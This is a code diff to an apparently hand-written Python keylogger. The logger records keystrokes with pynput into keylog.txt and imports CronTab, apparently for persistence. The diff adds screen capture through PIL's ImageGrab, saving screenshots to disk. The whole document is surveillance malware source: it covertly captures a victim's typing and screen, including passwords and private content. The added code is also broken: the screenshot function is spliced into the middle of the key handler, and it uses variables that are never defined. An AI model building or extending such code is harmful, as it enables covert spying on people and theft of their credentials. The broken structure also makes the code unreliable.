@@ -3,6 +3,9 @@
 from pynput.keyboard import Key, Listener
 import logging
 from crontab import CronTab
+from PIL import ImageGrab
+
+screenshot_info = "screenshot.png"
 
 # Initialize Log File
 logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s - %(message)s")
@@ -11,7 +14,10 @@ word=''
 # Whenever a key is pressed:
 def on_press(key):
     global word
-
+# Takes a screenshot 
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_info)
 # If the key is a space or the enter key, log the word go to the next line
     if key == Key.space or key == Key.enter or key == Key.tab:
         word += ' '
